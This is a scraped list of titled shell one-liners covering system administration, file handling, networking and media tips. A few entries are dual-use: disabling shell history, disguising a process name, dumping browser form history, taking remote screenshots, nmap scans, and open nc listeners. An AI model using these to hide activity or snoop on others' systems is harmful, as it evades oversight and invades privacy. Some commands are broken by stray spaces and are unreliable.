$ for db in $(mysql -e 'show databases' -s --skip-column-names); do  mysqldump $db |  gzip > "/backups/ mysqldump-$(hostname)-$db-$(date +%Y-%m-%d-%H.%M.%S).gz"; done
copy
Ultimate current directory usage command
$ ncdu
copy
bash: hotkey to put current commandline to text-editor
$ bash-hotkey: <CTRL+x+e>
copy
Show current working directory of a process
$ pwdx pid
copy
Have an ssh session open forever
$ autossh -M50000 -t server.example.com 'screen -raAd mysession'
copy
Base conversions with bc
$ echo "obase=2; 27" |  bc -l
copy
Put readline into vi mode
$ set -o  vi
copy
Transfer SSH public key to another machine in one step
$ ssh-keygen;   ssh-copy-id user@host;  ssh user@host
copy
Start a command on only one CPU core
$ taskset -c 0 your_command
copy
convert uppercase files to lowercase files
$ rename 'y/A-Z/a-z/' *
copy
return external ip
$ curl ipinfo.io
copy
Simple multi-user encrypted chat server for 5 users
$ ncat -vlm 5 --ssl --chat 9876
copy
Check if your ISP is intercepting DNS queries
$ dig +short which.opendns.com txt @208.67.220.220
copy
Display current time in requested time zones.
$ zdump Japan America/New_York
copy
Remove a range of lines from a file
$ sed -i <file> -re '<start>,<end>d'
copy
Stamp a text line on top of the pdf pages.
$ echo "This text gets stamped on the  top of the pdf pages." |  enscript -B -f Courier-Bold16 -o- |  ps2pdf - |  pdftk input.pdf stamp - output output.pdf
copy
Print diagram of user/groups
$ awk 'BEGIN{FS=":";  print "digraph{"}{split($4, a, ",");  for (i in a)  printf "\"%s\" [shape=box]
\"%s\" -> \"%s\"
", $1, a[i], $1}END{ print "}"}' /etc/group|display
copy
Create a file server, listening in port 7000
$ while true; do  nc -l 7000 |  tar -xvf -; done
copy
bypass any aliases and functions for the command
$ \foo
copy
Share your terminal session real-time
$ mkfifo foo;  script -f foo
copy
stderr in color
$ mycommand 2> >(while  read line; do  echo -e "\e[01;31m$line\e[0m"; done)
copy
VI config to save files with +x when a shebang is found on line 1
$ au BufWritePost *  if getline(1) =~ "^#!" |  if getline(1) =~ "/bin/" | silent !chmod +x <afile> | end if | end if
copy
Create a single PDF from multiple images with ImageMagick
$ convert *.jpg output.pdf
copy
Delete all empty lines from a file with vim
$ :g/^$/d
copy
perl one-liner to get the current week number
$ date +%V
copy
DELETE all those duplicate files but one based on md5 hash comparision in the current directory tree
$ find . -type f -print0|xargs -0 md5sum|sort|perl -ne 'chomp;$ph=$h;($h,$f)=split(/\s+/,$_,2);print "$f"."\x00"  if ($h eq $ph)'|xargs -0  rm -v --
copy
List recorded formular fields of Firefox
$ cd ~/.mozilla/firefox/ &&  sqlite3 `cat profiles.ini |  grep Path |  awk -F= '{print $2}'`/formhistory.sqlite "select *  from moz_formhistory" &&  cd - > /dev/null
copy
Using awk to sum/count a column of numbers.
$ cat count.txt |  awk '{ sum+=$1} END {print sum}'
copy
Get all the keyboard shortcuts in screen
$ ^A ?
copy
Get list of servers with a specific port open
$ nmap -sT -p 80 -oG - 192.168.1.* |  grep open
copy
Start a new command in a new screen window
$ alia s  s=' screen -X  screen';  s top;  s vi;  s  man l s;
copy
Notepad in a browser (type this in the URL bar)
$ data:text/html, <html contenteditable>
copy
Extract audio from Flash video (*.flv) as mp3 file
$ ffmpeg -i video.flv -vn -ar 44100 -ac 2 -ab 192k -f mp3 audio.mp3
copy
cat a bunch of small files with file indication
$ grep . *
copy
Stop Flash from tracking everything you do.
$ for i in ~/.adobe ~/.macromedia ; do (  rm $i/ -rf ;  ln -s /dev/null $i ) ; done
copy
send a circular
$ echo "dear admin, please ban eribsskog" |  wall
copy
List all open ports and their owning executables
$ lsof -i -P |  grep -i "listen"
copy
Purge configuration files of removed packages on debian based systems
$ aptitude purge '~c'
copy
Monitor open connections for httpd including listen, count and sort it per IP
$ watch "netstat -plan|grep :80|awk {'print \$5'} |  cut -d: -f 1 |  sort |  uniq -c |  sort -nk 1"
copy
Convert text to picture
$ echo -e "Some Text Line1
Some Text Line 2" |  convert -background none -density 196  -resample 72 -unsharp 0x.5 -font "Courier" text:- -trim +repage -bordercolor white -border 3  text.gif
copy
Remote screenshot
$ DISPLAY=":0.0"  import -window root screenshot.png
copy
Define words and phrases with google.
$ define(){  local y="$@";curl -sA"Opera" "http://www.google.com/search?q=define:${y// /+}"|grep -Po '(?<=<li>)[^<]+'|nl|perl -MHTML::Entities -pe 'decode_entities($_)' 2>/dev/null;}
copy
List all authors of a particular git project
$ git log --format='%aN' |  sort -u
copy
track flights from the command line
$ flight_status() {  if [[ $# -eq 3 ]];then offset=$3; else offset=0; fi;  curl "http://mobile.flightview.com/TrackByRoute.aspx?view=detail&al="$1"&fn="$2"&dpdat=$(date +%Y%m%d -d ${offset}day)" 2>/dev/null |html2text |grep ":"; }
copy
Harder, Faster, Stronger SSH clients
$ ssh -4 -C -c blowfish-cbc
copy
Clean up poorly named TV shows.
$ rename -v 's/.*[s,S](\d{2}).*[e,E](\d{2}).*\.avi/SHOWNAME\ S$1E$2.avi/' poorly.named.file.s01e01.avi
copy
Pretty Print a simple csv in the command line
$ column -s, -t <tmp.csv
copy
Cleanup firefox's database.
$ find ~/.mozilla/firefox/ -type f -name "*.sqlite" -exec  sqlite3 {} VACUUM \;
copy
Mount the first NTFS partition inside a VDI file (VirtualBox Disk Image)
$ mount -t  ntfs-3g -o ro,loop,uid=user,gid=group,umask=0007,fmask=0117,offset=0x$(hd -n 1000000  image.vdi |  grep "eb 52 90 4e 54 46 53" |  cut -c 1-8) image.vdi /mnt/vdi-ntfs
copy
check open ports
$ lsof -Pni4 |  grep LISTEN
copy
Find Duplicate Files (based on MD5 hash)
$ find -type f -exec  md5sum '{}' ';' |  sort |  uniq --all-repeated=separate -w 33 |  cut -c 35-
copy
Triple monitoring in screen
$ tmpfile=$(mktemp) &&  echo -e 'startup_message off
 screen -t  top h top
split
focus
 screen -t  nethogs  nethogs wlan0
split
focus
 screen -t io top io top' > $tmpfile &&  sudo  screen -c $tmpfile
copy
Print a great grey scale demo !
$ yes "$(seq 232 255;seq 254 -1 233)" |  while  read i; do  printf "\x1b[48;5;${i}m
";  sleep .01; done
copy
Create a list of binary numbers
$ echo {0..1}{0..1}{0..1}{0..1}
copy
Create a system overview dashboard on F12 key
$ bind '"\e[24~"':"\"ps -elF;df -h;free -mt;netstat -lnpt;who -a\C-m"""
copy
Save an HTML page, and covert it to a .pdf file
$ wget $URL | htmldoc --webpage -f "$URL".pdf - ;  xpdf "$URL".pdf &
copy
create an emergency swapfile when the existing swap space is getting tight
$ sudo  dd if=/dev/zero of=/swapfile bs=1024 count=1024000; sudo  mkswap /swapfile;  sudo  swapon /swapfile
copy
Relocate a file or directory, but keep it accessible on the old location throug a simlink.
$ mv $1 $2 &&  ln -s $2/$(basename $1) $(dirname $1)
copy
disable history for current shell session
$ unset HISTFILE
copy
a short counter
$ yes '' |  cat -n
copy
How to run X without any graphics hardware
$ startx -- `which Xvfb` :1 -screen 0 800x600x24 && DISPLAY=:1  x11vnc
copy
Rsync remote data as root using sudo
$ rsync -- rsync-path 'sudo  rsync' username@source:/folder/ /local/
copy
Convert all MySQL tables and fields to UTF8
$ mysql --database=dbname -B -N -e "SHOW TABLES"  |  awk '{print "ALTER TABLE", $1, "CONVERT TO CHARACTER SET utf8 COLLATE utf8_general_ci;"}' |  mysql --database=dbname &
copy
Quickly generate an MD5 hash for a text string using OpenSSL
$ echo -n 'text to be encrypted' |  openssl md5
copy
Pipe STDOUT to vim
$ tail -1000 /some/file |  vim -
copy
Copy stdin to your X11 buffer
$ ssh user@host  cat /path/to/some/file |  xclip
copy
Get info about remote host ports and OS detection
$ nmap -sS -P0 -sV -O <target>
copy
Copy a file structure without files
$ find * -type d -exec  mkdir /where/you/wantem/\{\} \;
copy
Get http headers for an url
$ curl -I www.commandlinefu.com
copy
Count files beneath current directory (including subfolders)
$ find . -type f |  wc -l
copy
random git-commit message
$ git commit -m "$(curl -s http://whatthecommit.com/index.txt)";
copy
Generate QR code for a WiFi hotspot
$ qrencode -s 7 -o qr-wifi.png "WIFI:S:$(zenity --entry --text="Network name (SSID)" --title="Create WiFi QR");T:WPA;P:$(zenity --password --title="Wifi Password");;"
copy
vi a remote file
$ vi scp://username@host//path/to/somefile
copy
Show what PID is listening on port 80 on Linux
$ fuser -v 80/tcp
copy
convert from hexidecimal or octal to decimal
$ echo $((0x1fe)) $((033))
copy
save man-page as pdf
$ man -t  awk |  ps2pdf -  awk.pdf
copy
Convert seconds into minutes and seconds
$ echo 'obase=60;299' |  bc
copy
List by size all of the directories in a given tree.
$ du -h /path |  sort -h
copy
List files accessed by a command
$ strace -ff -e trace=file my_command 2>&1 |  perl -ne 's/^[^"]+"(([^\\"]|\\[\\"nt])*)".*/$1/ && print'
copy
Find all the links to a file
$ find -L / -samefile /path/to/file -exec  ls -ld {} +
copy
Recover tmp flash videos (deleted immediately by the browser plugin)
$ for h in `find /proc/*/fd -i lname "/tmp/Flash*" 2>/dev/null`; do  ln -s "$h" `readlink "$h" |  cut -d' ' -f1`; done
copy
rsync instead of scp
$ rsync --progress --partial --rsh="ssh -p 8322" --bwlimit=100 --ipv4 user@domain.com:~/file.tgz .
copy
Visit wikileaks.com
$ echo 213.251.145.96 wikileaks.com >>/etc/hosts
copy
Make sudo forget password instantly
$ sudo -K
copy
Mirror a directory structure from websites with an Apache-generated file indexes
$ lftp -e "mirror -c" http://example.com/foobar/
copy
Quickly share code or text from vim to others.
$ :w !curl -F "sprunge=<-" http://sprunge.us |  xclip
copy
Print a row of characters across the terminal
$ printf "%`tput cols`s"|tr ' ' '#'
copy
Limit bandwidth usage by apt-get
$ sudo  apt-get -o Acquire::http::Dl-Limit=30 upgrade
copy
download and unpack tarball without leaving it sitting on your hard drive
$ wget -qO - http://example.com/path/to/blah. tar.gz |  tar xzf -
copy
Colored diff ( via vim ) on 2 remotes files on your local computer.
$ vimdiff scp://root@server-foo.com//etc/snmp/snmpd.conf scp://root@server-bar.com//etc/snmp/snmpd.conf
copy
Tune your guitar from the command line.
$ for  n i n E2 A2 D3 G3 B3 E4;do  play - n sy nth 4 pluck $ n repeat 2;do ne
copy
Split a tarball into multiple parts
$ tar  cf - <dir>|split -b<max_size>M - <name>. tar.
copy
Remove executable bit from all files in the current directory recursively, excluding other directories
$ chmod -R -x+X *
copy
Unbelievable Shell Colors, Shading, Backgrounds, Effects for Non-X
$ for c in `seq 0 255`;do t=5;[[ $c -lt 108 ]]&&t=0; for i in `seq $t 5`;do  echo -e "\e[0;48;$i;${c}m|| $i:$c `seq -s+0 $(($COLUMNS/2))|tr -d '[0-9]'`\e[0m";done;done
copy
More precise BASH debugging
$ env PS4=' ${BASH_SOURCE}:${LINENO}(${FUNCNAME[0]}) '  sh -x /etc/profile
copy
get all pdf and zips from a website using wget
$ wget --reject html,htm --accept pdf,zip -rl1 url
copy
Show me a histogram of the busiest minutes in a log file:
$ cat /var/log/secure.log |  awk '{print substr($0,0,12)}' |  uniq -c |  sort -nr |  awk '{printf("
%s ",$0) ;  for (i = 0; i<$1 ; i++) {printf("*")};}'
copy
Smiley Face Bash Prompt
$ PS1="\`if [ \$? = 0 ]; then  echo \e[33\;40m\\\^\\\_\\\^\e[0m; else  echo \e[36\;40m\\\-\e[0m\\\_\e[36\;40m\\\-\e[0m; fi\` \u \w:\h)"
copy
coloured tail
$ tail -f FILE |  perl -pe 's/KEYWORD/\e[1;31;43m$&\e[0m/g'
copy
Search for commands from the command line
$ clfu-seach <search words>
copy
Install a Firefox add-on/theme to all users
$ sudo  firefox -install-global-extension /path/to/add-on
copy
clear current line
$ CTRL+u
copy
Terminate a frozen SSH-session
$ RETURN~.
copy
Backup a remote database to your local filesystem
$ ssh user@host 'mysqldump dbname | gzip' > /path/to/backups/db-backup-`date +%Y-%m-%d`.sql.gz
copy
Download an entire static website to your local machine
$ wget --recursive  --page-requisites --convert-links www.moyagraphix.co.za
copy
Generat a Random MAC address
$ MAC=`(date;  cat /proc/interrupts) |  md5sum |  sed -r 's/^(.{10}).*$/\1/; s/([0-9a-f]{2})/\1:/g; s/:$//;'`
copy
Batch convert files to utf-8
$ find . -name "*.php" -exec  iconv -f ISO-8859-1 -t UTF-8 {} -o ../newdir_utf8/{} \;
copy
Run entire shell script as root
$ #!/usr/bin/sudo /bin/bash
copy
Check if system is 32bit or 64bit
$ arch
copy
Show permissions of current directory and all directories upwards to /
$ namei -m $(pwd)
copy
move you up one directory quickly
$ shopt -s autocd
copy
Hide the name of a process listed in the `ps` output
$ exec -a "/sbin/getty 38400 tty7" your_cmd -erase_all_files
copy
Remove a line from a file using sed (useful for updating known SSH server keys when they change)
$ ssh-keygen -R <thehost>
copy
Short and elegant way to backup a single file before you change it.
$ cp httpd.conf{,.bk}
copy
Find the most recently changed files (recursively)
$ find . -type f -printf '%TY-%Tm-%Td %TT %p
' |  sort
copy
All IP connected to my host
$ netstat -lantp |  grep ESTABLISHED | awk '{print $5}' |  awk -F: '{print $1}' |  sort -u
copy
Figure out what shell you're running
$ echo $0
copy
Download a file and uncompress it while it downloads
$ wget http://URL/FILE. tar.gz -O - |  tar xfz -
copy
List 10 largest directories in current directory
$ du -hs */ |  sort -hr |  head
copy
Rename all .jpeg and .JPG files to have .jpg extension
$ rename 's/\.jpe?g$/.jpg/i' *
copy
See where a shortened url takes you before click
$ check(){  curl -sI $1 |  sed -n 's/Location: *//p';}
copy
Stream YouTube URL directly to MPlayer
$ yt ()  mplayer -fs -quiet $(youtube-dl -g "$1")
copy
Generate a Random MAC address
$ openssl rand -hex 6 |  sed 's/\(..\)/\1:/g; s/.$//'
copy
Remove Thumbs.db files from folders
$ find ./ -name Thumbs.db -delete
copy
List open files that have no links to them on the filesystem
$ lsof +L1
copy
Display BIOS Information
$ #  dd if=/dev/mem bs=1k skip=768 count=256 2>/dev/null |  strings -n 8
copy
open path with your default program (on Linux/*BSD)
$ xdg-open [path]
copy
Copy an element from the previous command
$ !:1-3
copy
View user activity per directory.
$ sudo  lsof -u someuser -a +D /etc
copy
use the previous commands params in the current command
$ !!:[position]
copy
Choose from a nice graphical menu which DI.FM radio station to play
$ zenity --list --width 500 --height 500 --column 'radio' --column 'url' --print-column 2 $(curl -s http://www.di.fm/ |  awk -F '"' '/href="http:.*\.pls.*96k/ {print $2}' |  sort |  awk -F '/|\.' '{print $(NF-1) " " $0}') |  xargs  mplayer
copy
check the status of 'dd' in progress (OS X)
$ killall -INFO  dd
copy
copy from host1 to host2, through your host
$ ssh root@host1 "cd /somedir/tocopy/ &&  tar -cf - ." |  ssh root@host2 "cd /samedir/tocopyto/ &&  tar -xf -"
copy
Convert all Flac in a directory to Mp3 using maximum quality variable bitrate
$ for  file in *. flac; do  flac -cd "$ file" | lame -q 0 --vbr-new -V 0 - "${ file%. flac}.mp3"; done
copy
recursive search and replace old with new string, inside files
$ find . -type f -exec  sed -i s/oldstring/newstring/g {} +
copy
Clean your broken terminal
$ stty sane
copy
grep -v with multiple patterns.
$ grep 'test' somefile |  grep -vE '(error|critical|warning)'
copy
redirect stdout and stderr each to separate files and print both to the screen
$ (some_command 2>&1 1>&3 |  tee /path/to/errorlog ) 3>&1 1>&2 |  tee /path/to/stdoutlog
copy
Identify long lines in a file
$ awk 'length>72'  file
copy
Use all the cores or CPUs when compiling
$ make -j 4
copy
Prints total line count contribution per user for an SVN repository
$ svn  ls -R |  egrep -v -e "\/$" |  xargs  svn blame |  awk '{print $2}' |  sort |  uniq -c |  sort -r
copy
Analyze awk fields
$ awk '{print NR": "$0; for(i=1;i<=NF;++i)print "\t"i": "$i}'
copy
Colored SVN diff
$ svn  diff <file> |  vim -R -
copy
Run a command, store the output in a pastebin on the internet and place the URL on the xclipboard
$ ls |  curl -F 'sprunge=<-' http://sprunge.us |  xclip
copy
Show git branches by date - useful for showing active branches
$ for k in `git branch|perl -pe s/^..//`;do  echo -e `git show --pretty= format:"%Cgreen%ci %Cblue%cr%Creset" $k|head -n 1`\\t$k;done|sort -r
copy
Find if the command has an alias
$ type -all  command
copy
Find last reboot time
$ who -b
copy
Get your public ip using dyndns
$ curl -s http://checkip.dyndns.org/ |  grep -o "[[:digit:].]\+"
copy
Show a config file without comments
$ egrep -v "^$|^[[:space:]]*#" /etc/some/file
copy
Start screen in detached mode
$ screen -d -m [<command>]
copy
Given process ID print its environment variables
$ sed 's/\o0/
/g' /proc/INSERT_PID_HERE/environ
copy
Look up the definition of a word
$ curl dict://dict.org/d:something
copy
Diff files on two remote hosts.
$ diff <(ssh alice  cat /etc/apt/sources.list) <(ssh bob  cat /etc/apt/sources.list)
copy
Ctrl+S Ctrl+Q terminal output lock and unlock
$ Ctrl+S Ctrl+Q
copy
iso-8859-1 to utf-8 safe recursive rename
$ detox -r -s utf_8 /path/to/old/win/files/dir
copy
create dir tree
$ mkdir -p doc/{text/,img/{wallpaper/,photos/}}
copy
Run any GUI program remotely
$ ssh -fX <user>@<host> <program>
copy
Delete all empty lines from a file with vim
$ :g!/\S/d
copy
List the files any process is using
$ lsof +p xxxx
copy
Backup your hard drive with dd
$ sudo  dd if=/dev/sda of=/media/disk/backup/sda.backup
copy
Show biggest files/directories, biggest first with 'k,m,g' eyecandy
$ du --max-depth=1 |  sort -r -n |  awk '{split("k m g",v); s=1; while($1>1024){$1/=1024; s++}  print int($1)" "v[s]"\t"$2}'
copy
change directory to actual path instead of symlink path
$ cd `pwd -P`
copy
Recursively remove .svn directories from the current location
$ find . -type d -name '.svn' -print0 |  xargs -0  rm -rdf
copy
Read and write to TCP or UDP sockets with common bash tools
$ exec 5<>/dev/tcp/time.nist.gov/13;  cat <&5 &  cat >&5;  exec 5>&-
copy
Commandline document conversion with Libreoffice
$ soffice --headless -convert-to odt:"writer8" somefile.docx
copy
Use top to monitor only all processes with the same name fragment 'foo'
$ top -p $(pgrep -d , foo)
copy
HourGlass
$ hourglass(){  trap 'tput cnorm' 0 1 2 15 RETURN;local s=$(($SECONDS +$1));(tput civis;while (($SECONDS<$s));do  for f in '|' '\' '-' '/';do  echo -n "$f";sleep .2s; echo -n $'\b';done;done;);}
copy
delete command line last word
$ ctrl+w
copy
Swap the two last arguments of the current command line
$ <ctrl+e> <esc+t>
copy
Draw kernel module dependancy graph.
$ lsmod |  awk 'BEGIN{ print "digraph{"}{split($4, a, ",");  for (i in a)  print $1, "->", a[i]}END{ print "}"}'|display
copy
Color man pages
$ echo "export LESS_TERMCAP_mb=$'\E[01;31m'" >> ~/.bashrc
copy
Print without executing the last command that starts with...
$ !ssh:p
copy
What is the use of this switch ?
$ manswitch () {  man $1 |  less -p "^ +$2"; }
copy
Save the list of all available commands in your box to a file
$ compgen -c |  sort -u > commands
copy
Protect directory from an overzealous rm -rf *
$ cd <directory>;  touch ./-i
copy
Watch RX/TX rate of an interface in kb/s
$ while [ /bin/ true ]; do OLD=$NEW; NEW=`cat /proc/net/dev |  grep eth0 |  tr -s ' ' |  cut -d' ' -f "3 11"`;  echo $NEW $OLD |  awk '{printf("\rin: % 9.2g\t\tout: % 9.2g", ($1-$3)/1024, ($2-$4)/1024)}';  sleep 1; done
copy
Rapidly invoke an editor to write a long, complex, or tricky command
$ <ESC> v
copy
Reuse last parameter
$ !$
copy
Blink LED Port of NIC Card
$ ethtool -p eth0
copy
pretend to be busy in office to enjoy a cup of coffee
$ j=0;while true; do let j=$j+1;  for i in $(seq 0 20 100); do  echo $i;sleep 1; done |  dialog --gauge "Install part $j : `sed $(perl -e "print int rand(99999)")"q;d" /usr/share/dict/words`" 6 40;done
copy
Running scripts after a reboot for non-root users .
$ @reboot <yourscript.sh>
copy
run command on a group of nodes in parallel
$ echo "uptime" | pee "ssh host1" "ssh host2" "ssh host3"
copy
make, or run a script, everytime a file in a directory is modified
$ while true; do  inotifywait -r -e MODIFY dir/ && make; done;
copy
Convert a Nero Image File to ISO
$ dd bs=1k if=image.nrg of=image.iso skip=300
copy
Change prompt to MS-DOS one (joke)
$ export PS1="C:\$(  pwd |  sed 's:/:\\\\\\:g' )\\> "
copy
View network activity of any application or user in realtime
$ lsof -r 2 -p PID -i -a
copy
Copy with progress
$ rsync --progress file1 file2
copy
a shell function to print a ruler the width of the terminal window.
$ ruler() {  for  s in '....^....|' '1234567890'; do w=${# s};  str=$(  for (( i=1; $i<=$(( ($COLUMNS + $w) / $w )) ; i=$i+1 )); do  echo -n $ s; done );  str=$( echo $ str |  cut -c -$COLUMNS) ;  echo $ str; done; }
copy
Print a list of standard error codes and descriptions.
$ perl -le 'print $!+0, "\t", $!++  for 0..127'
copy
generate random password
$ pwgen -Bs 10 1
copy
A function to output a man page as a pdf file
$ function  man2pdf(){  man -t ${1:?Specify  man  as arg} |  ps2pdf -dCompatibility=1.3 - - > ${1}.pdf; }
copy
Search back through previous commands
$ Ctrl-R <search-text>
copy
Show directories in the PATH, one per line
$ echo $PATH |  tr \: \
copy
Move all images in a directory into a directory hierarchy based on year, month and day based on exif information
$ exiftool '-Directory<DateTimeOriginal' -d %Y/%m/%d  dir
copy
Follow tail by name (fix for rolling logs with tail -f)
$ tail -F  file
copy
Convert "man page" to text file
$ man  ls |  col -b > ~/Desktop/ man_ ls.txt
copy
Display current bandwidth statistics
$ ifstat -nt
copy
restoring some data from a corrupted text file
$ (  cat badfile.log ;  tac badfile.log |  tac ) > goodfile.log
copy
view the system console remotely
$ sudo  cat /dev/vcs1 |  fold -w 80
copy
Download all Delicious bookmarks
$ curl -u username -o bookmarks.xml https://api.del.icio.us/v1/posts/all
copy
Redirect STDIN
$ < /path/to/file.txt  grep foo
copy
I hate `echo X | Y`
$ base64 -d <<< aHR0cDovL3d3dy50d2l0dGVyc2hlZXAuY29tL3Jlc3VsdHMucGhwP3U9Y29tbWFuZGxpbmVmdQo=
copy
Send keypresses to an X application
$ xvkbd -xsendevent -text "Hello world"
copy
Add calendar to desktop wallpaper
$ convert -font -misc-fixed-*-*-*-*-*-*-*-*-*-*-*-* -fill  black -draw "text 270,260 \" `cal` \"" testpic.jpg newtestpic.jpg
copy
Browse system RAM in a human readable form
$ sudo  cat /proc/kcore |  strings |  awk 'length > 20' |  less
copy
Add forgotten changes to the last git commit
$ git commit --amend
copy
Calculates the date 2 weeks ago from Saturday the specified format.
$ date -d '2 weeks ago Saturday' +%Y-%m-%d
copy
Get Cisco network information
$ tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'
copy
Press ctrl+r in a bash shell and type a few letters of a previous command
$ ^r in  bash begins a reverse-search-history with  command completion
copy
Extract audio from a video
$ ffmpeg -i video.avi -f mp3 audio.mp3
copy
Quick glance at who's been using your system recently
$ last  |  grep -v "^$" |  awk '{  print $1 }' |  sort -nr |  uniq -c
copy
Get Dell Service Tag Number from a Dell Machine
$ sudo  dmidecode |  grep Serial\ Number |  head -n1
copy
ping a range of IP addresses
$ nmap -sP 192.168.1.100-254
copy
Use last argument of last command
$ file !$
copy
Show which programs are listening on TCP and UDP ports
$ netstat -plunt
copy
Print all git repos from a user
$ curl -s https://api.github.com/users/<username>/repos?per_page=1000 |grep git_url |awk '{print $2}'|  sed 's/"\(.*\)",/\1/'
copy
Determine if a port is open with bash
$ : </dev/tcp/127.0.0.1/80
copy
Search for a process by name
$ ps -fC PROCESSNAME
copy
Mount a VMware virtual disk (.vmdk) file on a Linux box
$ kpartx -av <image-flat.vmdk>;  mount -o /dev/mapper/loop0p1 /mnt/vmdk
copy
Download all mp3's listed in an html page
$ wget -r -l1 -H -t1 -nd -N -np -A.mp3 -erobots=off [url of website]
copy
Google text-to-speech in mp3 format
$ t2s() {  wget -q -U Mozilla -O $(tr ' ' _ <<< "$1"|  cut -b 1-15).mp3 "http://translate.google.com/translate_tts?ie=UTF-8&tl=en&q=$(tr ' ' + <<< "$1")"; }
copy
Run the built in PHP-server in current folder
$ php -S 127.0.0.1:8080
copy
Press enter and take a WebCam picture.
$ read &&  ffmpeg -y -r 1 -t 3 -f video4linux2 -vframes 1 -s sxga -i /dev/video0 ~/webcam-$(date +%m_%d_%Y_%H_%M).jpeg
copy
sort the output of the 'du' command by largest first, using human readable output.
$ du -h --max-depth=1 |sort -rh
copy
Verify/edit bash history command before executing it
$ shopt -s histverify
copy
Gets the english pronunciation of a phrase
$ say() {  mplayer "http://translate.google.com/translate_tts?q=$1"; }
copy
Check syntax for all PHP files in the current directory and all subdirectories
$ find . -name \*. php -exec  php -l "{}" \;
copy
Ask for a password, the passwd-style
$ read -s -p"Password: " USER_PASSWORD_VARIABLE;  echo
copy
monitor memory usage
$ watch  vmstat -sSM
copy
Content search.
$ ff() {  local IFS='|';  grep -rinE "$*" . ; }
copy
Timer with sound alarm
$ sleep 3s &&  espeak "wake up, you bastard" 2>/dev/null
copy
Run a program transparently, but print a stack trace if it fails
$ gdb -batch -ex "run" -ex "bt" ${my_program} 2>&1 |  grep -v ^"No stack."$
copy
Send email with curl and gmail
$ curl -n --ssl-reqd --mail-from "<user@gmail.com>" --mail-rcpt "<user@server.tld>" --url smtps://smtp.gmail.com:465 -T file.txt
copy
run command on a group of nodes in parallel
$ echo "uptime" |  tee >(ssh host1) >(ssh host2) >(ssh host3)
copy
Display BIOS Information
$ dmidecode -t bios
copy
List of commands you use most often
$ history |  awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' |  sort -rn |  head > /tmp/cmds |  gnuplot -persist <(echo 'plot "/tmp/cmds" using 1:xticlabels(2) with boxes')
copy
kill process by name
$ pkill -x  firefox
copy
Ping scanning without nmap
$ for i in {1..254}; do  ping -c 1 -W 1 10.1.1.$i |  grep 'from'; done
copy
Make ISO image of a folder
$ mkisofs -J -allow-lowercase -R -V "OpenCD8806" -iso-level 4 -o OpenCD.iso ~/OpenCD
copy
Typing the current date ( or any string ) via a shortcut as if the keys had been actually typed with the hardware keyboard in any application.
$ xvkbd -xsendevent -text $(date +%Y%m%d)
copy
Update twitter via curl (and also set the "from" bit)
$ curl -u twitter-username -d status="Hello World, Twitter!" -d source="cURL" http://twitter.com/statuses/update.xml
copy
quickest (i blv) way to get the current program name minus the path (BASH)
$ path_stripped_programname="${0##*/}"
copy
Play music from youtube without download
$ wget -q -O - `youtube-dl -b -g $url`|  ffmpeg -i - -f mp3 -vn -acodec libmp3lame -|  mpg123  -
copy
Function that outputs dots every second until command completes
$ sleeper(){  while `ps -p $1 &>/dev/null`; do  echo -n "${2:-.}";  sleep ${3:-1}; done; };  export -f  sleeper
copy
Identify differences between directories (possibly on different servers)
$ diff <(ssh server01 'cd config;  find . -type f -exec  md5sum {} \;|  sort -k 2') <(ssh server02 'cd config; find . -type f -exec  md5sum {} \;|  sort -k 2')
copy
Replace spaces in filenames with underscores
$ rename -v 's/ /_/g' *
copy
Show directories in the PATH, one per line
$ echo "${PATH//:/$'
'}"
copy
move a lot of files over ssh
$ rsync -az /home/user/test user@sshServer:/tmp/
copy
find and delete empty dirs, start in current working dir
$ find . -empty -type d -exec  rmdir {} +
copy
urldecoding
$ sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' |  xargs  echo -e
copy
Validate and pretty-print JSON expressions.
$ echo '{"json":"obj"}' |  python -m simplejson.tool
copy
List your largest installed packages.
$ wajig large
copy
Monitor TCP opened connections
$ watch -n 1 "netstat -tpanl |  grep ESTABLISHED"
copy
Fix Ubuntu's Broken Sound Server
$ sudo  killall -9  pulseaudio;  pulseaudio >/dev/null 2>&1 &
copy
beep when a server goes offline
$ while true; do [ "$(ping -c1W1w1 server-or-ip.com |  awk '/received/ {print $4}')" != 1 ] && beep;  sleep 1; done
copy
Number of open connections per ip.
$ netstat -ntu |  awk '{print $5}' |  cut -d: -f1 |  sort |  uniq -c |  sort -n
copy
Fibonacci numbers with awk
$ seq 50|  awk 'BEGIN {a=1; b=1} {print a; c=a+b; a=b; b=c}'
copy
Create a favicon
$ convert -colors 256 -resize 16x16 face.jpg face.ppm && ppmtowinicon -output favicon.ico face.ppm
copy
Check Ram Speed and Type in Linux
$ sudo  dmidecode --type 17 |  more
copy
Run the Firefox Profile Manager
$ firefox -no-remote -P
copy
Sort dotted quads
$ sort -nt . -k 1,1 -k 2,2 -k 3,3 -k 4,4
copy
Resume aborted scp file transfers
$ rsync --partial --progress --rsh=ssh SOURCE DESTINATION
copy
Another Curl your IP command
$ curl -s http://checkip.dyndns.org |  sed 's/[a-zA-Z<>/ :]//g'
copy
Add your public SSH key to a server in one command
$ cat . ssh/id_rsa.pub |  ssh  hostname ' cat >> . ssh/authorized_keys'
copy
cycle through a 256 colour palette
$ yes "$(seq 232 255;seq 254 -1 233)" |  while  read i; do  printf "\x1b[48;5;${i}m
";  sleep .01; done
copy
scping files with streamlines compression (tar gzip)
$ tar czv file1 file2 folder1 |  ssh user@server  tar zxv -C /destination
copy
Select rectangular screen area
$ Ctrl + Alt
copy
Google verbatim search on your terminal
$ function  google { Q="$@"; GOOG_URL='https://www. google.de/search?tbs=li:1&q='; AGENT="Mozilla/4.0"; stream=$(curl -A "$AGENT" -skLm 10 "${GOOG_URL}${Q//\ /+}" |  grep -oP '\/url\?q=.+?&amp' |  sed 's|/url?q=||; s|&amp||');  echo -e "${stream//\%/\x}"; }
copy
grep processes list avoiding the grep itself
$ ps axu |  grep [a]pache2
copy
Transfer a file to multiple hosts over ssh
$ pscp -h hosts.txt -l username /etc/hosts /tmp/hosts
copy
Daemonize nc - Transmit a file like a http server
$ while (  nc -l 80 < /file.htm > : ) ; do : ; done &
copy
tail a log over ssh
$ ssh  -t remotebox "tail -f /var/log/remote.log"
copy
du with colored bar graph
